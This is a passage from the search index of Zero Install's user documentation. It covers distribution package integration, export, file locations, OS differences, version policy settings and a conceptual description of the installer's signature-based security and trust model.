not conflict with files installed by the native package manager. If PackageKit is used instead, the user is prompted to confirm, since installing distribution packages can affect the system as a whole. Note that PackageKit can only be used to install packages from the distribution's repository. How it works Two methods are available to integrate Zero Install packages with distribution ones: A feed author can add a <package-implementation package=\"name\"/> element to their feed. Zero Install will query your distribution's package manager to see if a package with this name is already installed. If so, that version will be considered as another candidate, with a stability rating of \"packaged\" (which is ranked between \"stable\" and \"preferred\"). Since different distributions use different names for the same package, you can specify which distribution(s) an element applies to like this (some RPM-based distributions use pkgconfig , while other RPM systems use pkg-config , which is also the name used by Debian): <package-implementation distributions=\"RPM\" package=\"pkgconfig\"/> <package-implementation distributions=\"RPM Debian\" package=\"pkg-config\"/> <package-implementation distributions=\"Gentoo\" package=\"dev-util/pkgconfig\"/> A distribution package can install a file named /usr/share/0install.net/native_feeds/INTERFACE . This is automatically used as an additional feed for INTERFACE (replace / characters in the package's interface URI with # characters). This is useful if the package installs the program as a self-contained directory somewhere. i.e. the installed package has the same format as the Zero Install package. If the package already contains a local feed file, you can just symlink to it directly.","title":"Distribution integration"},{"location":"details/distribution-integration/#distribution-integration","text":"Supported distributions: Arch : Arch Linux - since 1.6 Cygwin : Cygwin - since 1.7 Darwin : (detects native Java) - since 1.11 Debian : dpkg-based (Debian, Mint, Ubuntu, etc) - since 0.28 Gentoo : Gentoo - since 0.45 MacPorts : Mac OS X (ports) - since 1.4 (also extends \"Darwin\") Ports : FreeBSD - since 0.47 RPM : RPM-based (Red Hat, Fedora, OpenSUSE, etc) - since 0.31 Slack : Slackware - since 0.48 Windows : Windows (detects native Java, .NET Framework, PowerShell and Git) - in Windows version If you have already installed a package using your distribution's installer then Zero install can use that instead of downloading a second copy using Zero Install. It can also use PackageKit to install them, if the user is authorised. For example, here is what happens if you ask to run AbiWord when you already have the libenchant1 library it requires installed using apt-get : $ 0launch http://0install.net/2006/autopackage/Abiword.xml If Abiword is itself installed as a distribution package, then the dialog is even simpler, and nothing needs to be downloaded: Of course, you are always free to change the selected version from the native package to a Zero Install version. This will also happen automatically if your native version is incompatible with the required version. For example, if you try this on a machine with a very old copy of libenchant1 then Zero Install will download a newer version rather than using that one. All software installed by Zero Install goes in the cache directory and does not conflict with files installed by the native package manager. If PackageKit is used instead, the user is prompted to confirm, since installing distribution packages can affect the system as a whole. Note that PackageKit can only be used to install packages from the distribution's repository.","title":"Distribution integration"},{"location":"details/distribution-integration/#how-it-works","text":"Two methods are available to integrate Zero Install packages with distribution ones: A feed author can add a <package-implementation package=\"name\"/> element to their feed. Zero Install will query your distribution's package manager to see if a package with this name is already installed. If so, that version will be considered as another candidate, with a stability rating of \"packaged\" (which is ranked between \"stable\" and \"preferred\"). Since different distributions use different names for the same package, you can specify which distribution(s) an element applies to like this (some RPM-based distributions use pkgconfig , while other RPM systems use pkg-config , which is also the name used by Debian): <package-implementation distributions=\"RPM\" package=\"pkgconfig\"/> <package-implementation distributions=\"RPM Debian\" package=\"pkg-config\"/> <package-implementation distributions=\"Gentoo\" package=\"dev-util/pkgconfig\"/> A distribution package can install a file named /usr/share/0install.net/native_feeds/INTERFACE . This is automatically used as an additional feed for INTERFACE (replace / characters in the package's interface URI with # characters). This is useful if the package installs the program as a self-contained directory somewhere. i.e. the installed package has the same format as the Zero Install package. If the package already contains a local feed file, you can just symlink to it directly.","title":"How it works"},{"location":"details/export/","text":"Zero Install automatically takes care of downloading applications and their dependencies when you run them on your computer. However, it is sometimes useful to download everything required to run an application and export it, e.g., for use on machine without an internet connection, or where the connection is very slow. Linux On Linux you can use the tool 0export to create self-installing bundles. Windows On Windows you can use the command 0install export to generate a directory with archives holding all required implementations and a small bootstrapping executable for importing them and setting up Zero Install on systems that don't have it yet. For example: $ 0install export --include-zero-install http://repo.roscidus.com/utils/vlc somedir The resulting directory structure will look something like this: somedir\\import.cmd A batch script for importing the contents on a machine that already has Zero Install set up. somedir\\run VLC media player.exe A modified version of the Bootstrapper for importing the contents and then running VLC on a machine that may not have Zero Install set up yet. somedir\\content\\22EA111A7E4242A4.gpg somedir\\content\\85A0F0DAB46EE668.gpg somedir\\content\\http%3a##0install.de#feeds#ZeroInstall.xml somedir\\content\\http%3a##repo.roscidus.com#dotnet#framework.xml somedir\\content\\http%3a##repo.roscidus.com#utils#vlc.xml The downloaded feeds and the GnuPG keys used to sign them. somedir\\content\\sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ.tbz2 somedir\\content\\sha256new_Z7MMJYZMBDNZMQKRUNOA3IEWGB7AXITJWCLK7RRXFIQ2EVBUX5JQ.tbz2 The implementations selected for VLC and Zero Install compressed as TAR BZ2 archives and named by their digests. Individual implementations You can also export individual implementations from the cache using the command 0install store export . For example: $ 0install store export sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ vlc-win64-3.0.6.tbz2","title":"Export"},{"location":"details/export/#linux","text":"On Linux you can use the tool 0export to create self-installing bundles.","title":"Linux"},{"location":"details/export/#windows","text":"On Windows you can use the command 0install export to generate a directory with archives holding all required implementations and a small bootstrapping executable for importing them and setting up Zero Install on systems that don't have it yet. For example: $ 0install export --include-zero-install http://repo.roscidus.com/utils/vlc somedir The resulting directory structure will look something like this: somedir\\import.cmd A batch script for importing the contents on a machine that already has Zero Install set up. somedir\\run VLC media player.exe A modified version of the Bootstrapper for importing the contents and then running VLC on a machine that may not have Zero Install set up yet. somedir\\content\\22EA111A7E4242A4.gpg somedir\\content\\85A0F0DAB46EE668.gpg somedir\\content\\http%3a##0install.de#feeds#ZeroInstall.xml somedir\\content\\http%3a##repo.roscidus.com#dotnet#framework.xml somedir\\content\\http%3a##repo.roscidus.com#utils#vlc.xml The downloaded feeds and the GnuPG keys used to sign them. somedir\\content\\sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ.tbz2 somedir\\content\\sha256new_Z7MMJYZMBDNZMQKRUNOA3IEWGB7AXITJWCLK7RRXFIQ2EVBUX5JQ.tbz2 The implementations selected for VLC and Zero Install compressed as TAR BZ2 archives and named by their digests.","title":"Windows"},{"location":"details/export/#individual-implementations","text":"You can also export individual implementations from the cache using the command 0install store export . For example: $ 0install store export sha256new_K44G7XQ4SOWRHVVFSXDW737RFQAKICZE6MAX35OJ7DJHABZKSLVQ vlc-win64-3.0.6.tbz2","title":"Individual implementations"},{"location":"details/file-locations/","text":"Zero Install reads and writes config files and caches during operation. This page documents the filesystem paths used on various operating systems: Linux Windows Linux On Linux Zero Install follows the XDG Base Directory Specification . General settings ~/.config/0install.net/injector /etc/xdg/0install.net/injector Interface-specific settings ~/.config/0install.net/injector/interfaces Feed-specific settings ~/.config/0install.net/injector/feeds Feed cache ~/.cache/0install.net/interfaces Implementation cache ~/.cache/0install.net/implementations Custom locations specified in ~/.config/0install.net/injector/implementation-dirs /var/cache/0install.net/implementations ( shared between users ) 0install apps ~/.config/0install.net/apps Windows On Windows Zero Install uses the well-known %AppData% , %LocalAppData% and %ProgramData% directories. You can use the potable mode to store all files in one directory (e.g. for use on a USB thumb drive) instead of using the following directories. Executables: %AppData%\\Programs\\Zero Install %ProgramFiles%\\Zero Install General settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector C:\\ProgramData\\0install.net\\injector Interface-specific settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\interfaces Feed-specific settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\feeds Feed cache C:\\Users\\Username\\AppData\\Local\\0install.net\\interfaces Implementation cache C:\\Users\\Username\\AppData\\Local\\0install.net\\implementations Custom locations specified in C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\implementation-dirs C:\\ProgramData\\0install.net\\implementations ( shared between users ) Desktop integration C:\\Users\\Username\\AppData\\Roaming\\0install.net\\desktop-integration C:\\ProgramData\\0install.net\\desktop-integration","title":"File locations"},{"location":"details/file-locations/#linux","text":"On Linux Zero Install follows the XDG Base Directory Specification . General settings ~/.config/0install.net/injector /etc/xdg/0install.net/injector Interface-specific settings ~/.config/0install.net/injector/interfaces Feed-specific settings ~/.config/0install.net/injector/feeds Feed cache ~/.cache/0install.net/interfaces Implementation cache ~/.cache/0install.net/implementations Custom locations specified in ~/.config/0install.net/injector/implementation-dirs /var/cache/0install.net/implementations ( shared between users ) 0install apps ~/.config/0install.net/apps","title":"Linux"},{"location":"details/file-locations/#windows","text":"On Windows Zero Install uses the well-known %AppData% , %LocalAppData% and %ProgramData% directories. You can use the potable mode to store all files in one directory (e.g. for use on a USB thumb drive) instead of using the following directories. Executables: %AppData%\\Programs\\Zero Install %ProgramFiles%\\Zero Install General settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector C:\\ProgramData\\0install.net\\injector Interface-specific settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\interfaces Feed-specific settings C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\feeds Feed cache C:\\Users\\Username\\AppData\\Local\\0install.net\\interfaces Implementation cache C:\\Users\\Username\\AppData\\Local\\0install.net\\implementations Custom locations specified in C:\\Users\\Username\\AppData\\Roaming\\0install.net\\injector\\implementation-dirs C:\\ProgramData\\0install.net\\implementations ( shared between users ) Desktop integration C:\\Users\\Username\\AppData\\Roaming\\0install.net\\desktop-integration C:\\ProgramData\\0install.net\\desktop-integration","title":"Windows"},{"location":"details/os-differences/","text":"The Linux version and Windows version of Zero Install share the same feed format . For most common use-cases they behave identically on the command-line. There are however some OS-specific differences. Version number Command-line interface Configuration files and caches Other differences Cross-platform use Feature comparison Version number The version numbers of the Linux and Windows versions of Zero Install are loosely coupled. If the first two components of the version number are the same (e.g. 2.1 and 2.1.3) they generally support the same features. Command-line interface The command-line interface of the Linux and Windows versions are largely identical, with the following exceptions: 0install add|destroy|show|whatchanged These app commands are only available in the Linux version so far. 0install man This man-page integration command is only available in the Linux version. 0install catalog search|refresh|add|remove|reset|list These catalog commands are only available in the Windows version so far. 0install add|remove|alias|integrate|update-all|repair-apps|sync These desktop integration commands are only available in the Windows version so far. 0install store list-implementations|purge These cache management commands are only available in the Windows version so far. 0install export and 0install store export These implementation exporting commands are only available in the Windows version so far. 0install maintenance|self-update These maintenance commands are only available in the Windows version. 0install run --no-wait On *nix systems Zero Install replaces itself with the application it launches using exec() . Since there is no direct exec() equivalent on Windows Zero Install launches a child process and waits for it to exit. This Windows-only command-line argument causes Zero Install to return immediately instead without waiting for the child to exit. 0install --dry-run Not implemented in the Windows version. 0install --console|gui These command-line arguments are not available in the Windows version. Instead it uses separate executables, 0install and 0install-win , to select console or GUI mode. 0install --background|batch These command-line arguments are only available in the Windows version. 0install select|download|run --customize This command-line argument is only available in the Windows version. Configuration files and caches The Linux and Windows versions mostly use the same formats for configuration files and caches. However, due to some limitations of the Windows filesystem they are not directly interchangeable. ~/.config/0install.net/injector/interfaces on Linux contains file names with colons in them. In the Windows counterpart %appdata%\\0install.net\\injector\\interfaces these are encoded as %3a . When extracting implementations Zero Install preserves executable-bits and symlinks and considers them when calculating manifest digests . Windows does not have a concept of executable bits. Instead, Zero Install for Windows stores this information in a file called .xbit in the top-level directory of each implementation. On Windows Administrator privileges are required to create symlinks. Therefore Zero Install creates Cygwin-style symlinks instead of \"real\" NTFS symlinks. See also: File locations Other differences The Windows version: uses NTFS ACLs instead of POSIX octets to make implementation directories read-only. provides in-process extraction code for all supported archive formats, since there is usually no tar , unzip , etc. in the PATH on Windows systems transparently handles Unix-style $ENVIRONMENT_VARIABLES rather than expecting them in the platform-specific %WINDOWS% style. creates binaries instead of shell scripts for command-line aliases and <executable-in-*> bindings. Cross-platform use The Windows version of Zero Install is written in in C#. It is primarily intended to be be used on Windows NT-based operating systems. However, the Zero Install .NET API it is based on is written with cross-platform support in mind and works on Linux using .NET Core. The Linux version of Zero Install is writtin in OCaml. It is primarily intended to be be used on Unixoid operating systems such as Linux and OS X. It can also be compiled for Windows, however, it lacks a number of Windows-specific features such as support for NTFS ACLs. The Windows version of Zero Install internally uses parts of the Linux version via the JSON API . Feature comparison Windows Version Linux Version Feed format Full support Full support Shared cache Yes (using Windows service ) Yes (using store helper ) Native package manager integration No Yes Apps with cached selection No Yes Catalog (recommended feeds and short names) Yes No Desktop integration (menu entries, file type associations, etc.) Yes Limited App list synchronization Yes No Portable mode Yes No Runs on Windows Yes Limited Runs on Linux Limited Yes Runs on MacOS X Limited Yes","title":"OS-specific differences"},{"location":"details/os-differences/#version-number","text":"The version numbers of the Linux and Windows versions of Zero Install are loosely coupled. If the first two components of the version number are the same (e.g. 2.1 and 2.1.3) they generally support the same features.","title":"Version number"},{"location":"details/os-differences/#command-line-interface","text":"The command-line interface of the Linux and Windows versions are largely identical, with the following exceptions: 0install add|destroy|show|whatchanged These app commands are only available in the Linux version so far. 0install man This man-page integration command is only available in the Linux version. 0install catalog search|refresh|add|remove|reset|list These catalog commands are only available in the Windows version so far. 0install add|remove|alias|integrate|update-all|repair-apps|sync These desktop integration commands are only available in the Windows version so far. 0install store list-implementations|purge These cache management commands are only available in the Windows version so far. 0install export and 0install store export These implementation exporting commands are only available in the Windows version so far. 0install maintenance|self-update These maintenance commands are only available in the Windows version. 0install run --no-wait On *nix systems Zero Install replaces itself with the application it launches using exec() . Since there is no direct exec() equivalent on Windows Zero Install launches a child process and waits for it to exit. This Windows-only command-line argument causes Zero Install to return immediately instead without waiting for the child to exit. 0install --dry-run Not implemented in the Windows version. 0install --console|gui These command-line arguments are not available in the Windows version. Instead it uses separate executables, 0install and 0install-win , to select console or GUI mode. 0install --background|batch These command-line arguments are only available in the Windows version. 0install select|download|run --customize This command-line argument is only available in the Windows version.","title":"Command-line interface"},{"location":"details/os-differences/#configuration-files-and-caches","text":"The Linux and Windows versions mostly use the same formats for configuration files and caches. However, due to some limitations of the Windows filesystem they are not directly interchangeable. ~/.config/0install.net/injector/interfaces on Linux contains file names with colons in them. In the Windows counterpart %appdata%\\0install.net\\injector\\interfaces these are encoded as %3a . When extracting implementations Zero Install preserves executable-bits and symlinks and considers them when calculating manifest digests . Windows does not have a concept of executable bits. Instead, Zero Install for Windows stores this information in a file called .xbit in the top-level directory of each implementation. On Windows Administrator privileges are required to create symlinks. Therefore Zero Install creates Cygwin-style symlinks instead of \"real\" NTFS symlinks. See also: File locations","title":"Configuration files and caches"},{"location":"details/os-differences/#other-differences","text":"The Windows version: uses NTFS ACLs instead of POSIX octets to make implementation directories read-only. provides in-process extraction code for all supported archive formats, since there is usually no tar , unzip , etc. in the PATH on Windows systems transparently handles Unix-style $ENVIRONMENT_VARIABLES rather than expecting them in the platform-specific %WINDOWS% style. creates binaries instead of shell scripts for command-line aliases and <executable-in-*> bindings.","title":"Other differences"},{"location":"details/os-differences/#cross-platform-use","text":"The Windows version of Zero Install is written in in C#. It is primarily intended to be be used on Windows NT-based operating systems. However, the Zero Install .NET API it is based on is written with cross-platform support in mind and works on Linux using .NET Core. The Linux version of Zero Install is writtin in OCaml. It is primarily intended to be be used on Unixoid operating systems such as Linux and OS X. It can also be compiled for Windows, however, it lacks a number of Windows-specific features such as support for NTFS ACLs. The Windows version of Zero Install internally uses parts of the Linux version via the JSON API .","title":"Cross-platform use"},{"location":"details/os-differences/#feature-comparison","text":"Windows Version Linux Version Feed format Full support Full support Shared cache Yes (using Windows service ) Yes (using store helper ) Native package manager integration No Yes Apps with cached selection No Yes Catalog (recommended feeds and short names) Yes No Desktop integration (menu entries, file type associations, etc.) Yes Limited App list synchronization Yes No Portable mode Yes No Runs on Windows Yes Limited Runs on Linux Limited Yes Runs on MacOS X Limited Yes","title":"Feature comparison"},{"location":"details/policy-settings/","text":"You can change policy settings to affect when 0install looks for updates and which versions it prefers. The first part shows how to set policy settings that apply to all applications of the current user. The last section shows how to change per-application settings. Policy affects which versions 0install chooses (do you want test versions, ...). General policy settings Network use Freshness Help test new versions Per-application policy settings Feeds Versions General policy settings You can change the policy settings using the Preferences dialog. To open it run 0install config ( 0install-win config on Windows). If you use the GNOME/KDE menu: choose Zero Install -> Manage Applications from the Applications menu, click on the edit properties icon next to an application and click Preferences: You can affect which versions are chosen by changing your policy. Three aspects of your policy are shown in the Preferences window: Network use , Freshness and Help test new versions : If you use Zero Install for Windows: click on Options in the bottom left to get this interface: Network use Affects how much 0install will rely on the network. Possible values are: Full Normal network use. Minimal 0install will prefer cached versions over non-cached ones. Off-line 0install will not use the network. Freshness 0install caches its feeds as well. It checks for updates to the feeds from time to time. The freshness indicates how old a feed may get before 0install automatically checks for updates to it. Note that 0install only checks for updates when you actually run a program; so if you never run something, it won't waste time checking for updates. If you notice a feed is out of date, you can force 0install to look for updates by clicking the Refresh all now button Help test new versions By default, 0install tries not to select new versions while they're still in the \"testing\" phase. If checked, 0install will instead always select the newest version, even if it's marked as \"testing\". Note that all changes to your policy are saved as soon as you make them. Clicking on Cancel will close the window without running the program, but any changes made to the policy are not reversed. Per-application policy settings You can change per-application policy settings in the application information dialog. There are multiple ways to opening this dialog: Run \"0install run\" with the --gui ( --customize on Windows) option and the URI of the application $ 0install run --gui http://rox.sourceforge.net/2005/interfaces/Edit > 0install run --customize http://repo.roscidus.com/utils/vlc Run \"0install update\" with a shortcut you made as first argument $ 0install update --gui rox-edit > 0install update --customize vlc If you use the GNOME/KDE menu: choose Zero Install -> Manage Applications from the Applications menu, click on the edit properties icon next to the application: Double-click the application in the list. For example, double-clicking on Edit displays this dialog box: Feeds In the Feeds tab, a list of feeds shows all the places where Zero Install looks for versions of Edit. By default, there is just one feed, whose URL is simply Edit's URI; you can view it in a web browser if you're interested: Edit's default feed . This is an XML file with a GPG signature at the end. The downloaded feed files are stored locally in ~/.cache/0install.net/interfaces (see File locations ). Versions The Versions tab shows all the versions found in all of the feeds: You can use the Preferred Stability setting in the interface dialog to choose which versions to prefer. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu (drop-down in the Override column on Windows). User-set ratings are shown in capitals. As you make changes to the policy and ratings, the selected implementation will change. The version shown in bold (or at the top of the list, in some versions) is the one that will actually be used. In addition to the ratings below, you can set the rating to Preferred . Such versions are always preferred above other versions, unless they're not cached and you are in Off-line mode. The following stability ratings are allowed: Stable (this is the default if Help test new versions is unchecked) Testing (this is the default if Help test new versions is checked) Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability is initially set to Testing . If you have selected Help test new versions in the Preferences dialog box then you will then start using it. Otherwise, you will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the author will change the implementation's stability to Stable so that everyone will use it. If problems are found, it will instead be marked as Buggy , or Insecure . Neither will be selected by default, but it is useful to see the reason (you might opt to continue using a buggy version if it works for you, but should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. Note: If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.","title":"Policy settings"},{"location":"details/policy-settings/#general-policy-settings","text":"You can change the policy settings using the Preferences dialog. To open it run 0install config ( 0install-win config on Windows). If you use the GNOME/KDE menu: choose Zero Install -> Manage Applications from the Applications menu, click on the edit properties icon next to an application and click Preferences: You can affect which versions are chosen by changing your policy. Three aspects of your policy are shown in the Preferences window: Network use , Freshness and Help test new versions : If you use Zero Install for Windows: click on Options in the bottom left to get this interface:","title":"General policy settings"},{"location":"details/policy-settings/#network-use","text":"Affects how much 0install will rely on the network. Possible values are: Full Normal network use. Minimal 0install will prefer cached versions over non-cached ones. Off-line 0install will not use the network.","title":"Network use"},{"location":"details/policy-settings/#freshness","text":"0install caches its feeds as well. It checks for updates to the feeds from time to time. The freshness indicates how old a feed may get before 0install automatically checks for updates to it. Note that 0install only checks for updates when you actually run a program; so if you never run something, it won't waste time checking for updates. If you notice a feed is out of date, you can force 0install to look for updates by clicking the Refresh all now button","title":"Freshness"},{"location":"details/policy-settings/#help-test-new-versions","text":"By default, 0install tries not to select new versions while they're still in the \"testing\" phase. If checked, 0install will instead always select the newest version, even if it's marked as \"testing\". Note that all changes to your policy are saved as soon as you make them. Clicking on Cancel will close the window without running the program, but any changes made to the policy are not reversed.","title":"Help test new versions"},{"location":"details/policy-settings/#per-application-policy-settings","text":"You can change per-application policy settings in the application information dialog. There are multiple ways to opening this dialog: Run \"0install run\" with the --gui ( --customize on Windows) option and the URI of the application $ 0install run --gui http://rox.sourceforge.net/2005/interfaces/Edit > 0install run --customize http://repo.roscidus.com/utils/vlc Run \"0install update\" with a shortcut you made as first argument $ 0install update --gui rox-edit > 0install update --customize vlc If you use the GNOME/KDE menu: choose Zero Install -> Manage Applications from the Applications menu, click on the edit properties icon next to the application: Double-click the application in the list. For example, double-clicking on Edit displays this dialog box:","title":"Per-application policy settings"},{"location":"details/policy-settings/#feeds","text":"In the Feeds tab, a list of feeds shows all the places where Zero Install looks for versions of Edit. By default, there is just one feed, whose URL is simply Edit's URI; you can view it in a web browser if you're interested: Edit's default feed . This is an XML file with a GPG signature at the end. The downloaded feed files are stored locally in ~/.cache/0install.net/interfaces (see File locations ).","title":"Feeds"},{"location":"details/policy-settings/#versions","text":"The Versions tab shows all the versions found in all of the feeds: You can use the Preferred Stability setting in the interface dialog to choose which versions to prefer. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu (drop-down in the Override column on Windows). User-set ratings are shown in capitals. As you make changes to the policy and ratings, the selected implementation will change. The version shown in bold (or at the top of the list, in some versions) is the one that will actually be used. In addition to the ratings below, you can set the rating to Preferred . Such versions are always preferred above other versions, unless they're not cached and you are in Off-line mode. The following stability ratings are allowed: Stable (this is the default if Help test new versions is unchecked) Testing (this is the default if Help test new versions is checked) Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability is initially set to Testing . If you have selected Help test new versions in the Preferences dialog box then you will then start using it. Otherwise, you will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the author will change the implementation's stability to Stable so that everyone will use it. If problems are found, it will instead be marked as Buggy , or Insecure . Neither will be selected by default, but it is useful to see the reason (you might opt to continue using a buggy version if it works for you, but should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. Note: If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.","title":"Versions"},{"location":"details/security/","text":"This page describes Zero Install's security model. I've noticed that if you describe a security model with digital signatures and GPG keys, people start worrying about all kinds of unlikely theoretical exploits. Whereas if you just stick software on the web with no security what-so-ever, everyone seems completely happy to use it. But for those few people who do care about security, this document explains how Zero Install tries to improve the situation. Overview Demo! Authorisation vs Privileges Security and Usability Zero Install's trust model Possible attacks Conclusions Overview No-one has the time to verify every line of code in every program they use. Yet, we need to use these programs to process our data, and we must guard against the possibility that the code we use is malicious. We need methods to help ensure that we don't allow malicious code to run, to limit the damage it can do if we do run it, and to discover and recover from compromises when they do happen. Some key points about Zero Install's security model: If one user downloads a malicious program, other users aren't affected In traditional systems, installing a program also puts files into shared directories like /usr/bin and /usr/lib under short names. So if one user installs the Gimp from http://evil.com then it might save the executable as /usr/bin/gimp . Another user might run this, thinking it was from http://gimp.org . In a Zero Install system, users specify the full URI of the program they want to run, and the system only shares the copy if they really are the same. The short-cuts (e.g., that \"Run gimp\" means \"Run http://gimp.org/gimp\" ) are per-user, but the programs themselves are shared. Installation does not execute any downloaded code Most installation systems run code in the downloaded package as part of the installation process. Typically, these scripts are run as root and can do anything they like to the machine. Zero Install merely fetches files into the cache during installation; nothing downloaded is executed and files from different packages cannot conflict (because they each go in their own directory). Digital signatures are always checked before software is run To protect against the possibility of attackers breaking into a web-server and replacing the real software with modified versions, or redirecting network traffic to the real web-server to their own, Zero Install only runs code that is signed by a GPG key you trust to provide software from that web-site. By default, it will automatically approve keys known to the key information server; this can be disabled from the preferences dialog. Security when running programs is your problem Zero Install goes to great lengths to get software on to your machine without letting it do anything dangerous, but what happens next is up to you. On a normal Linux system this still brings some benefits (e.g. users can share programs without also sharing viruses), but the real advantages come when you combine this with some sandboxing technology to restrict what programs can do when running. Demo! For a demonstration of using sandboxing with Zero Install, see ebox . Authorisation vs Privileges It's also important to separate out two aspects of installation that are easily confused: who is authorised to install software and what privileges the software is given by the act of installing it. Here, \"apt-get\" is used as a short-hard for \"a typical traditional Linux package manager\": Privileges granted Only root can install things Anyone can install things Full access Default apt-get apt-get with modified rules No access Zero Install with restrictions Default Zero Install A typical package manager only allows root (or an administrator) to install software by default, and grants that software full access to the machine, including access to all user accounts. You can change the rules to allow others to install software (e.g. using PolicyKit or sudoers, you might allow anyone to upgrade a package), but the software still gets complete access to the machine. Zero Install allows anyone to install software by default, but gives the software no access to the machine (since it doesn't run any of its code at install time). You could configure Zero Install so that only root can install software, but the software would still get no ability to do anything at install time. The reason we allow anyone to install software by default is the principle of Do Not Prohibit What You Cannot Prevent [citation needed]. On Linux, unprivileged users can install software even without Zero Install, so trying to stop them makes life harder for legitimate users but doesn't improve security. Security and Usability Some people think of security and usability as a trade-off, with systems being either easy to use, or secure, but not both. But in fact, security is a necessary part of usability. Some examples: I used to program on a system which had no memory protection, allowing any process to overwrite any other process's memory. Linux prevents programs from doing this. This makes my life as a programmer easier, not harder, because when a program crashes I know that the problem is in that program and not in some other one. Sometimes, I forget where I saved a file. But, I never need to search /usr in case I accidentally saved my letter there; it can't be there, because my word processor doesn't have permission to save there. Windows users (so I hear) often find their computers are infected with spyware and adware, which slows them down, causes crashes, and redirects them to undesirable web sites. Such a system has poor usability. An artist may find a useful image processing filter on the web. If all this filter can do is read an input image and output a modified one then the artist is more likely to try it (and produce better work). If image filters can seriously damage the system then the artist may have to pass it over; the risk from a malicious filter is too great. Few programs are as easy to run in a restricted environment as the image filter example above; an accounting package needs access to my accounts, for example. Still, with good security we can evaluate lots of possible programs and then only weigh up the risk for the one we choose. Without good security we must evaluate fewer programs, and we are at risk from each one we try. Good security is therefore vital to a usable system. A usable system must be understandable and predictable; on a system where any action can have any consequence this is not possible. Consider traditional software installation on Linux or Windows. You download some package and execute a script inside it. Imagine that I give you a package in your favourite format (setup.exe, .deb, .rpm, source tarball, etc) and ask you to install it. Assume that your system is functioning correctly; what will happen as a result of installing this program? Will a new item appear on your Start menu (or equivalent)? Will some other program on your computer stop working as a result of a installing this one? Will a new service be added to your boot sequence? Will your browser's saved passwords be posted to an IRC server and your hard disk reformatted? The answer, for all the formats listed above, is \"I don't know\". With Zero Install, none of these things can happen without some extra action on your part. Now, Zero Install is not a complete solution to these problems. In particular, it does not stop programs from doing any of these things when run . That problem is for some other project to solve (and there are plenty of people working on this; see Plash or SysTrace for example). But Zero Install already brings benefits without the use of these programs (the effects above which require root access will be blocked), and it is clearly a necessary base on which such technologies can be built. Being able to run software in a sandbox is of limited benefit if it requires full root access to install it first! Zero Install's trust model Sandboxing is used to restrict what code can do. Linux and similar systems come with a simple sandboxing system based on users. The system has a number of users, and each user can run whatever software they please. Ideally, it is not possible for malicious code executed by one user to damage the system or threaten the security of any other user. However, the code can do anything that the user running it is permitted to do (such as delete that user's files, or log the user's keystrokes and send them to another computer). A second approach is to ensure that only software written by trusted individuals is run. This presents two problems: how do we come to trust someone to provide reliable software, and how do we know that a particular program really came from them? The basis of Zero Install's model is the standard multi-user model used by Linux. The principle is that the system's responsibility is to protect users from each other, and to protect the system from the users. If one user (or a program they run) can delete another user's files without permission, then that is a problem with the system's security. However, the system is not responsible for protecting users from themselves; it is up to users to take appropriate measures to prevent the programs they run from damaging their own files, for example. Of course, the system may itself have bugs. Ideally, the system should be upgraded when a problem is found (e.g. in the Linux kernel). However, if users are using sandboxing to protect themselves from the programs they run then this may provide an added layer of protection to the system, assuming the users themselves are not malicious. Users can protect themselves by using additional sandboxes within their own sandboxed user account. A good example of this is User-Mode-Linux , which runs a new Linux system within a single user account of a main Linux system. The user can use the sub-Linux's security features to restrict what applications can do inside it, while the whole sub-Linux system is restricted to the user's permissions within the main Linux system. More light-weight sandboxes include running JavaScript in a web browser, or running Java applications with Java's sandboxing turned on. However, good per-user sandboxing is still more of a long-term goal for Linux than a practical solution for many programs at the moment (but see Plash for a good example of where things are heading). Also, some programs really do need full access to the user's files. For example, a file manager needs to be able to delete the user's files, and an email client needs to be able to read the user's emails and send new ones, so making sure that software is not malicious in the first place is very important. When deciding whether to trust a particular programmer, the user will have to consult external sources. Distributions typically fill this role (recommending certain programs only), and friends, magazines, etc, can provide this information too. A trusted programmer is identified by their GPG key's fingerprint. When the user runs a program, Zero Install downloads the feed and checks that it is signed by someone the user trusts. If not, the user is asked to confirm that they trust the holder of the key to provide software to them: Once trusted, Zero Install will accept any feed from the same domain signed by that key. Zero Install updates feeds at the request of the user (clicking the 'Refresh' button), or automatically (monthly, by default) if the user sets their freshness policy to request this. If a program is not used, Zero Install does not check for updates to it. Zero Install does not accept incoming network connections, so even if a malicious key is trusted, the owner must still get the user to download a feed they control. Possible attacks To run malicious software on a user's machine, an attacker could: Publish the software on their own web-page, and convince users to run it, or Cause their software to be run when the user tries to run some other program. Guarding against the first requires educating users not to run untrusted software (this applies whether using Zero Install or not), sandboxing any software that is run if possible, and advising users that the software is unknown and/or known to be malicious. Organisations may wish to keep their own internal database of programs approved for use within the organisation, and to prevent users from installing programs not on this list. To perform the second attack, the attacker needs to replace a trusted feed file on a server with a compromised version. However, the new file must be signed, and the secret signing key should not be on the server. Therefore, the attacker has two options: Break into the developer's private machine, get their private GPG key, install a keystroke logger, and get the GPG pass-phrase. Then break into the web server and install a compromised signed feed. Break into the webserver and install a feed signed with their own key (a new key with a new fingerprint, but claiming to belong to the original author), and trick users into accepting it. The second option is probably easiest. 